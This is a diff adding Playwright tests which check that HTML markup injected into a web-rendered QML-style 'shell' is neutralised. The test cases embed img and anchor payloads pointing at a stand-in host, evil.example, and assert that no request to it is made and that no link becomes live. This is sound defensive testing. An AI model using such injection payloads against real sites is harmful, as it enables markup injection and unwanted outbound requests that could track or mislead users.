@@ -209,6 +209,70 @@ test.describe("A binding that runs away", () => {
   });
 });
 
+test.describe("A shell's text names no URL, however it reaches a text", () => {
+  test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));
+  const EVIL = "https://evil.example/x.png";
+  const fetched = (page) => {
+    const asked = [];
+    page.on("request", (request) => request.url().startsWith("https://evil.example") && asked.push(request.url()));
+    return asked;
+  };
+  const pictures = (page, name) => page.evaluate((name) => [...window.named(name).$node.querySelectorAll("img")].filter((image) => image.hasAttribute("src")).length, name);
+
+  for (const [what, line, name] of [
+    ["given to a block that is a Text", `    Title { objectName: "given"; text: "<img src='${EVIL}'>" }`, "given"],
+    ["bound with a block's state", `    Title { objectName: "given"; text: "<img src='${EVIL}?" + basket.count + "'>" }`, "given"],
+    ["passed on by a block to its own Text", `    Headline { objectName: "given"; title: "<img src='${EVIL}'>" }`, "given"],
+  ]) {
+    test(`Markup ${what} fetches nothing`, async ({ page }) => {
+      const asked = fetched(page);
+      await opened(page);
+      await dropped(page, over(line));
+      await expect(errors(page)).toBeHidden();
+      await page.waitForTimeout(100);
+      expect(asked).toEqual([]);
+      expect(await pictures(page, name)).toBe(0);
+    });
+  }
+
+  test("Markup a handler writes to a block fetches nothing", async ({ page }) => {
+    const asked = fetched(page);
+    await opened(page);
+    await dropped(page, over(`    Title { id: told; objectName: "given" }\n    MouseArea { objectName: "tap"; width: 10; height: 10; onClicked: told.text = "<img src='${EVIL}'>" }`));
+    await page.evaluate(() => {
+      window.named("tap").clicked({ x: 0, y: 0 });
+      window.flush();
+    });
+    await page.waitForTimeout(100);
+    expect(await read(page, "given", "text")).toContain("evil.example");
+    expect(asked).toEqual([]);
+    expect(await pictures(page, "given")).toBe(0);
+  });
+
+  test("A link a shell's markup names is no link", async ({ page }) => {
+    await opened(page);
+    await dropped(page, over(`    Title { objectName: "given"; text: "<a href='${EVIL}'>go</a>" }`));
+    expect(await page.evaluate(() => window.named("given").$node.querySelectorAll("[data-link]").length)).toBe(0);
+  });
+
+  test("The site's own markup has its pictures again when its shell is back", async ({ page }) => {
+    await opened(page);
+    expect(await pictures(page, "note")).toBe(1);
+    await dropped(page, over('    Note { objectName: "note" }'));
+    await expect.poll(() => pictures(page, "note")).toBe(0);
+    await page.getByRole("button", { name: "Reset" }).click();
+    await page.evaluate(() => window.live.idle());
+    await expect.poll(() => pictures(page, "note")).toBe(1);
+  });
+
+  test("A shell refused over the site's leaves the site's markup its pictures", async ({ page }) => {
+    await opened(page);
+    await dropped(page, "import QtQuick\nColumn { NoSuchThing {} }\n");
+    await expect(errors(page)).toBeVisible();
+    expect(await pictures(page, "note")).toBe(1);
+  });
+});
+
 test.describe("Each use of a block is its own", () => {
   test.beforeEach(({ page }) => page.addInitScript(() => localStorage.clear()));
   const cards = (page) =>
